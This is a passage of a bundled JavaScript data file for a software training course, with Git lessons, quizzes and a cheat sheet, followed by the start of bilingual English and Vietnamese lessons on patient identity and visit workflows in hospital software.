commits are too large for the server to accept"],answer:1,why:'The server branch moved since your last fetch. Pull (or fetch and rebase) first, then push again. Do not force-push to "fix" it.'}]},{id:"git.merge-rebase",title:"Merge vs rebase",summary:"Two ways to combine work, and when each is safe.",minutes:5,blocks:[{type:"text",text:"Your branch started from `C`. Meanwhile, someone added `F` to `main`. Now you want both."},{type:"diagram",text:`Before:
A──B──C──F           main
      └──D──E        feature`},{type:"text",text:"**Merge** creates a new **merge commit** `M`. It has two parents, so the history shows both lines of work."},{type:"diagram",text:`Merge:
A──B──C─────F─────M  main
      │           │
      └──D──E─────┘  feature`},{type:"text",text:"**Rebase** replays your commits on top of the new `main`. The result is one straight line. But `D` and `E` become **new** commits `D'` and `E'` with new hashes."},{type:"diagram",text:`Rebase:
A──B──C──F           main
         └──D'──E'   feature

Then main moves forward:
A──B──C──F──D'──E'   main`},{type:"compare",left:{title:"Merge",items:["Keeps the real history","Adds a merge commit","Safe on shared branches"]},right:{title:"Rebase",items:["Straight, easy-to-read history","Rewrites commits (new hashes)","Only for commits nobody else has"]}},{type:"text",text:"**Golden rule:** do not rebase commits that others already pulled. They still have the old commits, and the two histories no longer match.\nA **squash merge** turns all commits of a branch into one new commit on `main`."},{type:"example",title:"Squash merge in a team",text:'Your pull request has 12 commits like "wip" and "fix typo". The team uses squash merge. Main gets one clean commit: "Add VAT to invoices".'}],remember:"Merge keeps history. Rebase rewrites it, so only rebase what nobody else has.",questions:[{id:"git.merge-rebase.1",kind:"truefalse",difficulty:"medium",prompt:"After a rebase, your commits keep the same hashes as before.",choices:["True","False"],answer:1,why:"A rebase creates new commits with a new parent. A new parent means a new hash, even when the code change is the same."},{id:"git.merge-rebase.2",kind:"compare",difficulty:"medium",prompt:"Your branch exists only on your laptop. The team likes a straight history. You want the latest `main` in your branch. Which is better?",choices:["Rebase your branch onto the latest `main`","Merge `main` into your branch every hour"],answer:0,why:"Nobody else has your commits yet, so rewriting them is safe. Rebase gives the straight history the team wants without extra merge commits."},{id:"git.merge-rebase.3",kind:"scenario",difficulty:"hard",prompt:"You rebase the shared `develop` branch and force-push it. Five teammates already pulled the old `develop`. What happens next?",choices:["Nothing, because Git maps old hashes to new ones","Their next pull can bring back old commits as duplicates","The server rejects the push, because develop is shared","Their local changes are deleted on their next fetch"],answer:1,why:"Teammates still have the old commits. When they pull, Git sees two different histories and merges them, so the same changes appear twice.",remember:"Never rewrite history that others already pulled."},{id:"git.merge-rebase.4",kind:"mcq",difficulty:"easy",prompt:"A pull request with 8 commits is merged with **squash merge**. What does `main` get?",choices:["All 8 commits, plus one merge commit on top","One new commit that holds all 8 changes together","All 8 commits, copied in a straight line","Only the last of the 8 commits"],answer:1,why:"Squash merge combines the changes of the whole branch into one new commit. The small commits stay only on the branch."}]},{id:"git.conflicts",title:"Merge conflicts",summary:"Why they happen and how to fix them calmly.",minutes:4,blocks:[{type:"text",text:"A **conflict** happens when two branches change the **same lines** in different ways. Git cannot know which version is right, so it asks you."},{type:"diagram",text:`   base:  total = price * 1.08
        ┌──────────┴──────────┐
     main:                 feature:
  rate → 1.10          adds round()
        └──────────┬──────────┘
         same line, two answers
               → CONFLICT`},{type:"text",text:"Git writes both versions into the file, between **conflict markers**:"},{type:"code",code:{lang:"text",text:`<<<<<<< HEAD
total = price * 1.10;
=======
total = round(price * 1.08);
>>>>>>> feature/rounding`}},{type:"text",text:"Above `=======` is your current branch (`HEAD`). Below it is the branch you are merging in. During a rebase, the two sides are swapped."},{type:"list",items:["Open the file and understand **both** changes.","Write the correct code. It is often a mix of both sides.","Delete all marker lines.","Build and run the tests.","`git add` the file, then `git commit` (or `git rebase --continue`)."]},{type:"example",title:"Do not just pick a side",text:"Lan changed the VAT rate to 1.10. Minh added rounding. The right result is `round(price * 1.10)`. Picking only one side silently deletes a teammate's work."},{type:"text",text:"Fewer conflicts: keep pull requests small, pull `main` often, and merge soon. Do not mix a big reformat with logic changes."}],remember:"Conflict = same lines, two answers. Combine both, remove markers, test, then commit.",questions:[{id:"git.conflicts.1",kind:"mcq",difficulty:"easy",prompt:"When does Git report a merge conflict?",choices:["When two branches change different files","When two branches change the same lines differently","When a branch has more than ten new commits","When the same person made commits on both branches"],answer:1,why:"Changes to different files, or to different parts of a file, merge automatically. Git stops only when it cannot choose between two edits."},{id:"git.conflicts.2",kind:"code",difficulty:"medium",prompt:"You are on `main` and run `git merge feature/rounding`. Which line came from `feature/rounding`?",code:{lang:"text",text:`<<<<<<< HEAD
total = price * 1.10;
=======
total = round(price * 1.08);
>>>>>>> feature/rounding`},choices:["`total = price * 1.10;`","`total = round(price * 1.08);`","Both lines came from feature/rounding","Neither; both lines are from the base"],answer:1,why:"In a merge, the part above `=======` is `HEAD`, your current branch. The part below is the branch named after `>>>>>>>`."},{id:"git.conflicts.3",kind:"scenario",difficulty:"medium",prompt:"`main` changed the rate to 1.10. Your branch added rounding to the old line. What is the best resolution?",choices:["Keep `total = price * 1.10;` from main","Keep `total = round(price * 1.08);` from your branch","Write `total = round(price * 1.10);`","Keep both lines, one after the other"],answer:2,why:"Both changes were wanted: the new rate and the rounding. Picking one side throws away the other person's work.",remember:"Resolve by intent: what did each side want?"},{id:"git.conflicts.4",kind:"debug",difficulty:"medium",prompt:'Right after a merge, the CI build fails with "Unexpected token" on a line that starts with `<<<<<<<`. What happened?',choices:["The CI server uses an older compiler version","Conflict markers were committed without being removed","The merge commit has two parents, which CI cannot build","Git added the markers to the file after the push"],answer:1,why:"Someone resolved the conflict but left the marker lines in the file. Build and test before you commit the resolution."},{id:"git.conflicts.5",kind:"scenario",difficulty:"hard",prompt:"Every pull request in your team ends with big conflicts. Branches live 3 weeks and change 2,000 lines. What helps most?",choices:["Smaller pull requests that merge within a day or two","Let only one senior developer do all the merges",'Always choose "keep mine" when a conflict appears',"Stop pulling `main` until the feature is finished"],answer:0,why:"Conflicts grow with time and size. Small branches that merge fast overlap less with other work, so conflicts are rare and small."}]},{id:"git.undo",title:"Undo safely",summary:"restore, revert, reset and reflog: pick the right one.",minutes:5,blocks:[{type:"diagram",text:`Problem                     Tool
──────────────────────────  ───────────
Bad edit, not committed     restore
Staged by mistake           restore
                            --staged
Bad commit, already pushed  revert
Bad commit, only local      reset
"I lost my commit!"         reflog`},{type:"text",text:"`git revert` makes a **new** commit that undoes an old one. History is not rewritten, so it is safe on shared branches."},{type:"diagram",text:`A──B──C──C'      C' undoes C
         ▲
   history kept, safe to push`},{type:"text",text:"`git reset` moves your branch back to an older commit. It rewrites **local** history. The three modes differ in what happens to the changes."},{type:"diagram",text:`git reset --soft HEAD~1
   changes stay staged
git reset --mixed HEAD~1   (default)
   changes stay, not staged
git reset --hard HEAD~1
   changes are deleted`},{type:"code",code:{lang:"bash",text:`git restore app.ts           # discard edits
git restore --staged app.ts  # unstage only
git revert 4c5d6e7           # new undo commit
git reflog                   # where was HEAD?
git branch rescue 9f8e7d6    # get a commit back
git push --force-with-lease  # careful push`}},{type:"text",text:'**reflog** lists every place `HEAD` has been on your machine. A commit you "lost" with reset is usually still there for some time.\nIt only helps with committed work. Edits you never committed cannot come back.'},{type:"compare",left:{title:"push --force",items:["Overwrites the server branch","Can delete commits others pushed","Avoid it"]},right:{title:"push --force-with-lease",items:["Overwrites only if nobody pushed since your fetch","Refuses if the branch moved","Use it after a rebase of your own branch"]}},{type:"example",title:"Friday afternoon",text:"A bad commit on `main` breaks checkout. Three teammates already pulled it. You run `git revert` and push. Everyone gets the fix with a normal pull."}],remember:"Shared history → revert. Local history → reset. Lost a commit → reflog.",questions:[{id:"git.undo.1",kind:"scenario",difficulty:"medium",prompt:"A bad commit is on `main`. It is already pushed and teammates pulled it. How do you undo it?",choices:["`git reset --hard HEAD~1`, then force-push main","`git revert <hash>`, then a normal push","Delete the file in a new commit, then push","`git restore .`, then push main again"],answer:1,why:"Revert adds a new commit that undoes the bad one. Nobody's history is rewritten. A reset plus force-push would break every teammate's copy.",remember:"Pushed and shared → revert."},{id:"git.undo.2",kind:"compare",difficulty:"medium",prompt:"You rebased your own pull request branch and must push it again. Which command is better?",choices:["`git push --force`","`git push --force-with-lease`"],answer:1,why:"`--force-with-lease` refuses to push if someone else pushed to that branch since your last fetch. Plain `--force` overwrites their commits without a warning."},{id:"git.undo.3",kind:"scenario",difficulty:"hard",prompt:"You ran `git reset --hard HEAD~3` by mistake. Three good commits are gone from your branch. They were never pushed. What do you do?",choices:["Nothing can be done, because they were never pushed","Find their hash with `git reflog`, then reset or branch to it","Run `git revert HEAD~3` to bring the three commits back","Run `git restore .` to recover the deleted commits"],answer:1,why:"The commits still exist on your machine for some time. `git reflog` shows where `HEAD` was before the reset, so you can point a branch there again.",remember:"reflog is the safety net for committed work."},{id:"git.undo.4",kind:"code",difficulty:"hard",prompt:"You have uncommitted edits in `app.ts`. You run this command. What happens?",code:{lang:"bash",text:"git reset --hard HEAD~1"},choices:["The last commit is removed; your app.ts edits are staged","The last commit is removed; your app.ts edits are deleted","Only your app.ts edits are deleted; the commit stays","Git refuses, because you have uncommitted edits"],answer:1,why:"`--hard` moves the branch back and makes the files match that commit. Uncommitted edits are thrown away, and reflog cannot bring them back."},{id:"git.undo.5",kind:"truefalse",difficulty:"easy",prompt:"If you discard edits with `git restore app.ts`, you can get them back with `git reflog`.",choices:["True","False"],answer:1,why:"Reflog only tracks commits. Edits that were never committed were never saved by Git, so they are gone."}]},{id:"git.pull-requests",title:"Good commits and pull requests",summary:"Small, clear changes that are easy to review.",minutes:4,blocks:[{type:"text",text:"A good commit does **one thing**. Its message says **what** changed and **why**.\nA **pull request** (PR) asks the team to review a branch before it joins `main`."},{type:"code",code:{lang:"text",text:`Fix VAT rounding on invoices

Totals were rounded on each line, so
long invoices could be off by a few
cents. Now we round once, on the total.

Refs: #482`}},{type:"compare",left:{title:"Hard to review",items:['Message: "fix" or "update stuff"',"Feature + refactor + reformat in one","2,000 lines in one pull request"]},right:{title:"Easy to review",items:["Short subject line: what changed","Body: why it was needed","One purpose, a few hundred lines at most"]}},{type:"diagram",text:`branch → commits → push → open PR
                            │
              ┌─────────────┴──────┐
              ▼                    ▼
        CI: build + tests    team review
              │                    │
              └─────────┬──────────┘
                        ▼
              both pass → merge`},{type:"text",text:"**CI** (continuous integration) is a server that builds the code and runs the tests on every push. Make CI checks **required** before a merge."},{type:"example",title:"Why small wins",text:'A 2,000-line PR waits three days. Then it gets a quick "looks good". A 150-line PR gets real comments within an hour. The small one catches more bugs.'}],remember:"One purpose per change. The message says why. CI and review pass before merge.",questions:[{id:"git.pull-requests.1",kind:"compare",difficulty:"easy",prompt:"Which commit message is more useful to a teammate six months later?",choices:['"fix bug"','"Fix VAT rounding on invoice total"'],answer:1,why:'It says what changed and where. "fix bug" forces the reader to open the diff to understand anything.'},{id:"git.pull-requests.2",kind:"scenario",difficulty:"medium",prompt:"Your PR adds a discount feature. Your editor also reformatted 40 other files. What is the best step?",choices:["Keep it as one PR, because the reformat does no harm","Split it: a format-only PR and a feature-only PR","Ask reviewers to skip every file that only changed format","Turn off CI for this PR, because format changes are safe"],answer:1,why:"Mixed changes hide the real logic among noise. Two PRs let reviewers focus on the feature and approve the format change quickly.",remember:"One PR, one purpose."},{id:"git.pull-requests.3",kind:"mcq",difficulty:"medium",prompt:"The diff already shows what code changed. What should the commit message body mainly explain?",choices:["Each line that changed, in the same order as the diff","Why the change was needed and any tradeoff you made","How long the change took and who helped with it","The full list of files that the commit touches"],answer:1,why:"The code shows what. Only the author knows why. That reason helps the next person who wonders if the code can be changed."},{id:"git.pull-requests.4",kind:"debug",difficulty:"medium",prompt:"Every PR is reviewed, but `main` often fails to build after a merge. What is most likely missing?",choices:["A second reviewer on every pull request","Required CI checks that must pass before merge","A rule that commits must have longer messages","A rule that only seniors may open pull requests"],answer:1,why:"Humans miss build errors and failing tests. A required CI check runs them automatically and blocks the merge when they fail."}]},{id:"git.hygiene",title:"Repo hygiene and branching strategy",summary:"Ignore files, protect secrets, tag releases, pick a workflow.",minutes:5,blocks:[{type:"text",text:"A `.gitignore` file lists files Git should not track. For example: build output, local settings and secret files."},{type:"code",code:{lang:"text",text:`# build output
bin/
obj/
dist/
node_modules/
# local settings and secrets
.env
*.log`}},{type:"text",text:"`.gitignore` only affects files Git does not track yet. If a file is already tracked, run `git rm --cached <file>` to stop tracking it."},{type:"diagram",text:`commit A: add .env (API key inside)
commit B: delete .env
            │
            ▼
history still has commit A
anyone with the repo can run:
  git show A:.env
→ change (rotate) the key first`},{type:"example",title:"A leaked key",text:"A developer pushes a cloud key to a public repo, then deletes it. Bots scan public repos for keys all the time. The key must be replaced at once. Cleaning history comes second."},{type:"text",text:"A **tag** is a fixed name on one commit, like `v1.4.0`. Unlike a branch, it does not move. Use tags to mark releases."},{type:"code",code:{lang:"bash",text:`git tag -a v1.4.0 -m "Release 1.4.0"
git push origin v1.4.0   # tags are not pushed
                         # by a plain git push`}},{type:"diagram",text:`Trunk-based
main ──o──o──o──o──o──o──
        └o┘   └o┘ └o┘   short branches

Git Flow
main    ──o───────────o──  releases
develop ──o──o──o──o──o──
            └o──o──o┘      feature`},{type:"compare",left:{title:"Trunk-based",items:["Branches live hours or a few days","Merge to main often","Feature flags hide unfinished work"]},right:{title:"Git Flow",items:["develop, feature, release, hotfix branches","Fits planned, versioned releases","Long branches mean more conflicts"]}},{type:"text",text:"A **feature flag** is a switch in config. Unfinished code can be merged and deployed but stays off until you turn it on."}],remember:"Ignore build files, never commit secrets, tag releases, keep branches short.",questions:[{id:"git.hygiene.1",kind:"scenario",difficulty:"hard",prompt:"You pushed a database password. Ten minutes later you pushed a commit that deletes the file. What must you do first?",choices:["Nothing more, because the file is deleted now","Change the password, because history still has it","Add the file to `.gitignore` and push again","Make the repository private for a few days"],answer:1,why:"The old commit still contains the password, and others may have cloned it. Rotate the secret first. Cleaning history can follow.",remember:"A leaked secret is burned. Rotate it."},{id:"git.hygiene.2",kind:"debug",difficulty:"medium",prompt:"You added `appsettings.Local.json` to `.gitignore`. `git status` still shows your changes to it. Why?",choices:["The pattern in .gitignore must start with a slash","The file was already tracked; .gitignore skips only untracked files","Git reads .gitignore only after the next commit is made","JSON files cannot be ignored, only folders and logs"],answer:1,why:".gitignore does not apply to tracked files. Run `git rm --cached appsettings.Local.json` and commit, so Git stops tracking it."},{id:"git.hygiene.3",kind:"compare",difficulty:"medium",prompt:"Your team deploys several times a day and wants few merge conflicts. Which strategy fits better?",choices:["Git Flow, with long feature branches and a develop branch","Trunk-based, with short branches and feature flags"],answer:1,why:"Short branches merge quickly, so they rarely conflict. Feature flags let unfinished work be in main without users seeing it."},{id:"git.hygiene.4",kind:"perf",difficulty:"hard",prompt:"Cloning the repo takes 15 minutes, but the current code is small. Two years ago someone committed large video files, then deleted them. Why is it slow?",choices:["The server is far away, so every file downloads slowly","Old commits still hold the videos, and clone downloads history","Deleted files stay on disk until someone runs a cleanup","Git compresses small files badly, so the clone is huge"],answer:1,why:"A normal clone downloads every commit, including the old videos. Keep big binaries out of Git, or store them with a tool like Git LFS."},{id:"git.hygiene.5",kind:"truefalse",difficulty:"easy",prompt:"A plain `git push` also sends your new tags to the server.",choices:["True","False"],answer:1,why:"Tags are not pushed by default. Push one with `git push origin v1.4.0`, or all of them with `git push --tags`."}]}],cheatSheet:[{title:"Daily commands",items:[{term:"git status",meaning:"What is changed, staged or untracked"},{term:"git diff / diff --staged",meaning:"Changes not staged yet / changes in the next commit"},{term:"git add <file>",meaning:"Stage a change for the next commit"},{term:"git commit -m",meaning:"Save a snapshot of what is staged"},{term:"git log --oneline",meaning:"Short list of commits"},{term:"git switch -c <name>",meaning:"Create a branch and move to it"}]},{title:"Working with the server",items:[{term:"origin",meaning:"Usual name of the shared remote repository"},{term:"origin/main",meaning:"Your record of main on the server at the last fetch"},{term:"git fetch",meaning:"Download commits; your branches do not change"},{term:"git pull",meaning:"Fetch, then merge (or rebase) into your branch"},{term:"git push",meaning:"Upload your commits and move the server branch"}]},{title:"Combining work",items:[{term:"Merge",meaning:"Merge commit with two parents; keeps real history"},{term:"Rebase",meaning:"Replays commits on a new base; new hashes"},{term:"Squash merge",meaning:"Whole branch becomes one commit on main"},{term:"Golden rule",meaning:"Do not rebase commits others already pulled"},{term:"Conflict markers",meaning:"<<<<<<< ours, ======= split, >>>>>>> theirs; remove all"}]},{title:"Undo",items:[{term:"git restore <file>",meaning:"Discard uncommitted edits (cannot be undone)"},{term:"git revert <hash>",meaning:"New commit that undoes an old one; safe when shared"},{term:"git reset --soft / --mixed / --hard",meaning:"Move branch back; keep staged / keep unstaged / delete changes"},{term:"git reflog",meaning:"Where HEAD has been; finds lost commits"},{term:"--force-with-lease",meaning:"Force-push only if nobody pushed since your fetch"}]},{title:"Hygiene",items:[{term:".gitignore",meaning:"Files Git should not track; tracked files need git rm --cached"},{term:"Leaked secret",meaning:"Still in history after delete; rotate it first"},{term:"Tag",meaning:"Fixed name on a commit for a release; push it on its own"},{term:"Trunk-based",meaning:"Short branches, merge often, feature flags"},{term:"Git Flow",meaning:"develop + feature + release + hotfix branches"}]}]},H=Object.freeze(Object.defineProperty({__proto__:null,default:B},Symbol.toStringTag,{value:"Module"})),F={id:"healthcare",group:"domain",title:"Healthcare",emoji:"🏥",tagline:`Software where a bug can hurt a patient
VI: Phần mềm mà một lỗi có thể gây hại cho người bệnh`,lessons:[{id:"healthcare.patient-identity",title:"Patient identity and the medical record · Định danh người bệnh và bệnh án",summary:`One patient, one ID. Duplicates and wrong merges are dangerous.
VI: Một người bệnh, một mã. Trùng hồ sơ và gộp nhầm hồ sơ đều nguy hiểm.`,minutes:4,blocks:[{type:"text",text:`Every patient gets one **patient ID**. It is a unique code for that person. All visits, results and prescriptions are linked to this ID.
VI: Mỗi người bệnh có một **mã người bệnh** duy nhất. Mọi lần khám, kết quả và đơn thuốc đều gắn với mã này.`},{type:"diagram",text:`           Patient P000123
           (Nguyễn Văn An)
                  │
    ┌─────────────┼─────────────┐
    ▼             ▼             ▼
  Visits      Lab results  Prescriptions
 (lần khám)  (xét nghiệm)   (đơn thuốc)
    │             │             │
    └──── one medical record ───┘
           (bệnh án điện tử)`},{type:"text",text:`A **duplicate patient** is one real person with two IDs. It happens when the front desk cannot find the old record and creates a new one. Then the doctor sees only half the history. An allergy saved on the old ID is not shown.
VI: **Trùng hồ sơ** là một người thật nhưng có hai mã. Lỗi này xảy ra khi bộ phận tiếp đón không tìm thấy hồ sơ cũ và tạo hồ sơ mới. Khi đó bác sĩ chỉ thấy một nửa tiền sử. Thông tin dị ứng lưu ở mã cũ sẽ không hiện ra.`},{type:"text",text:`To find a match, compare several fields. Use name, date of birth, citizen ID card (CCCD) and health insurance number (BHYT). A name alone is never enough.
VI: Để tìm đúng người, hãy so nhiều trường. Dùng họ tên, ngày sinh, số CCCD và số thẻ BHYT. Chỉ dựa vào họ tên thì không bao giờ đủ.`},{type:"diagram",text:`Field       Record A       Record B
──────────  ─────────────  ─────────────
Name        Nguyễn Văn An  Nguyen Van An
Birth date  12/05/1990     12/05/1990
CCCD        079...123      (empty)
BHYT no.    same           same
────────────────────────────────────────
→ probably the same person
→ a trained person reviews, then merges`},{type:"compare",left:{title:"Duplicate (trùng hồ sơ) ⚠️",items:["One person, two IDs","History is split in two","Fix: merge the two records"]},right:{title:"Wrong merge (gộp nhầm) ❌",items:["Two people, one ID","A doctor sees another person’s data","Much worse: needs an unmerge"]}},{type:"example",title:"Two men named Nguyễn Văn An",text:`Two men named Nguyễn Văn An visit on the same day. The clerk picks the first search result. Now one man’s X-ray is in the other man’s record.
VI: Hai người cùng tên Nguyễn Văn An đến khám cùng ngày. Nhân viên tiếp đón chọn kết quả tìm kiếm đầu tiên. Thế là phim X-quang của người này nằm trong hồ sơ của người kia.`},{type:"code",code:{lang:"sql",text:`-- One row per real person
CREATE TABLE Patient (
  Id           INT PRIMARY KEY,
  PatientCode  VARCHAR(20) UNIQUE,
  FullName     NVARCHAR(100) NOT NULL,
  BirthDate    DATE NOT NULL,
  CitizenId    VARCHAR(12) NULL,
  InsuranceNo  VARCHAR(20) NULL,
  MergedIntoId INT NULL -- set by a merge
);`}},{type:"text",text:`A **merge** keeps one surviving ID. The old ID is not deleted; it points to the survivor. Every merge is logged and can be undone. **EMR** (electronic medical record) is the record inside one hospital. **EHR** (electronic health record) follows the patient across many places.
VI: Khi **gộp hồ sơ**, ta giữ lại một mã chính. Mã cũ không bị xóa mà trỏ sang mã chính. Mỗi lần gộp đều được ghi log và có thể hoàn tác. **EMR** là bệnh án điện tử trong một bệnh viện. **EHR** là hồ sơ sức khỏe điện tử, đi theo người bệnh qua nhiều nơi.`}],remember:`Match on several fields, merge with care, never delete the old ID.
VI: So khớp bằng nhiều trường, gộp hồ sơ thận trọng, không bao giờ xóa mã cũ.`,questions:[{id:"healthcare.patient-identity.1",kind:"mcq",difficulty:"easy",prompt:`The front desk searches for an existing patient. Which set of fields gives the safest match?
VI: Tiếp đón tìm một người bệnh đã có hồ sơ. Bộ trường nào cho kết quả khớp an toàn nhất?`,choices:["Full name only","Name, birth date, CCCD and BHYT number","Phone number and the street name","Name and the last doctor they saw"],answer:1,why:`Many people share a name, and phones change. Several fields together, including official ID numbers, make a wrong match much less likely.
VI: Nhiều người trùng tên, số điện thoại cũng hay đổi. Kết hợp nhiều trường, gồm cả số giấy tờ chính thức, giúp giảm nhiều khả năng khớp nhầm.`},{id:"healthcare.patient-identity.2",kind:"scenario",difficulty:"medium",prompt:`A clerk cannot find a returning patient, so she creates a new record. What is the biggest risk?
VI: Nhân viên không tìm thấy một người bệnh cũ nên tạo hồ sơ mới. Rủi ro lớn nhất là gì?`,choices:["The database runs out of patient IDs sooner","The doctor does not see the old allergy and history","The patient pays twice for the registration fee","The queue number is printed with the wrong room"],answer:1,why:`The old allergies, results and diagnoses stay on the old ID. The doctor works with half the history. That can lead to a harmful prescription.
VI: Dị ứng, kết quả và chẩn đoán cũ vẫn nằm ở mã cũ. Bác sĩ chỉ làm việc với một nửa tiền sử. Điều đó có thể dẫn đến kê đơn gây hại.`},{id:"healthcare.patient-identity.3",kind:"compare",difficulty:"hard",prompt:`Which mistake is usually more dangerous for patients?
VI: Lỗi nào thường nguy hiểm hơn cho người bệnh?`,choices:["A duplicate: one person split across two IDs","A wrong merge: two people joined under one ID","Both are equal, because both break the history"],answer:1,why:`A duplicate hides data, which is bad. A wrong merge shows another person’s data as if it were true. Doctors may treat the patient based on someone else’s results.
VI: Trùng hồ sơ làm thiếu dữ liệu, điều đó là xấu. Gộp nhầm lại hiển thị dữ liệu của người khác như thể là thật. Bác sĩ có thể điều trị dựa trên kết quả của người khác.`},{id:"healthcare.patient-identity.4",kind:"debug",difficulty:"medium",prompt:`Patient 17 was merged into patient 42. The screen for patient 42 now misses all old lab results. What is the likely cause?
VI: Người bệnh 17 đã được gộp vào người bệnh 42. Màn hình của người bệnh 42 không còn thấy kết quả xét nghiệm cũ. Nguyên nhân có thể là gì?`,code:{lang:"sql",text:`SELECT * FROM LabResult
WHERE PatientId = 42;`},choices:["The old results still have PatientId = 17","The lab machine deleted the old results","The query needs ORDER BY to show old rows","SQL Server hides rows older than one year"],answer:0,why:"The merge set `MergedIntoId` but did not move or link the old rows. The query must include merged IDs, or the merge must move the rows.\nVI: Thao tác gộp chỉ đặt `MergedIntoId` mà không chuyển hay liên kết các dòng cũ. Câu truy vấn phải tính cả các mã đã gộp, hoặc khi gộp phải chuyển các dòng đó."},{id:"healthcare.patient-identity.5",kind:"truefalse",difficulty:"easy",prompt:`After two records are merged, the old patient ID can be safely deleted.
VI: Sau khi gộp hai hồ sơ, có thể xóa mã người bệnh cũ một cách an toàn.`,choices:["True","False"],answer:1,why:`Old papers, images and other systems still use the old ID. Keep it and point it to the survivor. You also need it if the merge must be undone.
VI: Giấy tờ cũ, hình ảnh và các hệ thống khác vẫn dùng mã cũ. Hãy giữ mã cũ và trỏ nó sang mã chính. Bạn cũng cần nó nếu phải hoàn tác việc gộp.`}]},{id:"healthcare.patient-journey",title:"The patient journey · Hành trình người bệnh",summary:`From registration to billing, step by step.
VI: Từ tiếp đón đến thanh toán viện phí, từng bước một.`,minutes:4,blocks:[{type:"text",text:`A hospital visit is a chain of steps. Different teams do each step, often on different screens.
VI: Một lần đến bệnh viện là một chuỗi bước. Mỗi bước do một bộ phận khác làm, thường trên một màn hình khác.`},{type:"diagram",text:`Registration (tiếp đón)
      │  queue number (số thứ tự)
      ▼
Triage (phân loại, sàng lọc)
      ▼
Doctor exam (khám bệnh)
      │  needs tests?
      ▼
Lab / imaging (cận lâm sàng)
      │  results come back
      ▼
Diagnosis (chẩn đoán)
      ▼
Prescription (kê đơn)
      ▼
Pharmacy (nhà thuốc)
      ▼
Billing (viện phí)`},{type:"text",text:`The system tracks one visit as an **encounter** (lượt khám). The encounter has a status that moves step by step.
VI: Hệ thống theo dõi một lần đến khám bằng một **lượt khám** (encounter). Lượt khám có trạng thái chuyển dần theo từng bước.`},{type:"diagram",text:`Registered → Waiting → InExam
                          │
                          ▼
                   WaitingResults
                          │
                          ▼
                   Concluded → Closed

any step → LeftEarly / Cancelled`},{type:"compare",left:{title:"Outpatient (ngoại trú)",items:["Comes and goes home the same day","One short encounter","Takes drugs home"]},right:{title:"Inpatient (nội trú)",items:["Admitted to a ward and a bed","Many days of orders and notes","Admission, transfer, discharge"]}},{type:"text",text:`Each room has its own **queue** (hàng chờ). Registration prints a queue number. Some groups may get priority, for example emergency cases. The exact rules come from the hospital, not from the developer.
VI: Mỗi phòng có một **hàng chờ** riêng. Tiếp đón in số thứ tự cho người bệnh. Một số nhóm có thể được ưu tiên, ví dụ ca cấp cứu. Quy tắc cụ thể do bệnh viện quyết định, không phải lập trình viên.`},{type:"example",title:"Back to the end of the line",text:`A patient gets lab results at 10:00 and returns to the doctor. The system puts him at the end of the queue. He waits two more hours. The hospital wanted returning patients called sooner, but nobody asked.
VI: Một người bệnh có kết quả xét nghiệm lúc 10 giờ và quay lại phòng khám. Hệ thống xếp anh ấy xuống cuối hàng. Anh ấy chờ thêm hai tiếng. Bệnh viện muốn gọi người quay lại sớm hơn, nhưng không ai hỏi.`},{type:"list",items:["Ask: do patients pay before tests, or at the end?","Ask: can one visit see two doctors in two rooms?","Ask: who gets priority in the queue?","Ask: what happens if a patient leaves before the end?"]}],remember:`One visit = one encounter with clear statuses. Ask the hospital for the rules of each step.
VI: Một lần khám = một lượt khám với trạng thái rõ ràng. Hãy hỏi bệnh viện quy tắc của từng bước.`,questions:[{id:"healthcare.patient-journey.1",kind:"mcq",difficulty:"easy",prompt:`What is the main difference between outpatient and inpatient care?
VI: Khác biệt chính giữa ngoại trú và nội trú là gì?`,choices:["Outpatients pay cash; inpatients always use insurance","Inpatients stay in a bed for days; outpatients go home","Outpatients never get lab tests or imaging","Inpatients do not need a patient ID"],answer:1,why:`Inpatients are admitted to a ward and stay. That brings beds, daily orders, transfers and discharge. Outpatients come and go the same day.
VI: Người bệnh nội trú được nhập khoa và nằm lại. Kèm theo đó là giường, chỉ định hằng ngày, chuyển khoa và ra viện. Người bệnh ngoại trú đến và về trong ngày.`},{id:"healthcare.patient-journey.2",kind:"scenario",difficulty:"medium",prompt:"Some patients do the tests and then leave without seeing the doctor again. Their encounters stay in `WaitingResults` forever. What should you do?\nVI: Một số người bệnh làm xét nghiệm xong rồi về, không quay lại gặp bác sĩ. Lượt khám của họ mãi ở trạng thái `WaitingResults`. Bạn nên làm gì?",choices:["Delete those encounters every night with a job","Ask the business for a rule, then add a LeftEarly status","Mark them Closed at once, as if the visit was normal","Hide them from the screen and leave the data as is"],answer:1,why:`This is a real business case, so it needs a real rule and status. Deleting loses medical data. Closing them as normal hides that the doctor never saw the results.
VI: Đây là tình huống nghiệp vụ thật nên cần quy tắc và trạng thái thật. Xóa thì mất dữ liệu y tế. Đóng như bình thường sẽ che đi việc bác sĩ chưa xem kết quả.`},{id:"healthcare.patient-journey.3",kind:"debug",difficulty:"medium",prompt:`The doctor’s queue screen shows patients from yesterday mixed with today’s patients. What is the most likely cause?
VI: Màn hình hàng chờ của bác sĩ hiện cả người bệnh hôm qua lẫn hôm nay. Nguyên nhân khả dĩ nhất là gì?`,choices:["The screen filters by status only, and old encounters were never closed","The printer used yesterday’s paper roll for the queue numbers","The database clock is one hour ahead of the server clock","The patients registered twice with two different patient IDs"],answer:0,why:"Old encounters still have the status `Waiting`. A filter on status alone shows them again. Filter by date too, and close or end stale encounters with a clear rule.\nVI: Các lượt khám cũ vẫn ở trạng thái `Waiting`. Lọc chỉ theo trạng thái nên chúng hiện lại. Hãy lọc thêm theo ngày, và đóng các lượt khám tồn đọng theo một quy tắc rõ ràng."},{id:"healthcare.patient-journey.4",kind:"compare",difficulty:"hard",prompt:`The manager wants a report of average waiting time at each step. Which design supports it?
VI: Quản lý muốn báo cáo thời gian chờ trung bình ở từng bước. Thiết kế nào đáp ứng được?`,choices:["Store only the current status on the encounter row","Save a status history row with a time for each change","Ask the staff to type the waiting time at the end"],answer:1,why:`With a history of status changes and their times, you can measure every step. The current status alone forgets when each step started.
VI: Có lịch sử thay đổi trạng thái kèm thời điểm thì đo được mọi bước. Chỉ lưu trạng thái hiện tại thì không biết mỗi bước bắt đầu lúc nào.`}]},{id:"healthcare.orders-results",title:"Orders and results · Chỉ định và kết quả",summary:`How a test request travels between systems and comes back.
VI: Một chỉ định đi qua các hệ thống và kết quả quay về như thế nào.`,minutes:5,blocks:[{type:"text",text:`A doctor creates an **order** (chỉ định). It is a request for a test or an image for one patient in one encounter.
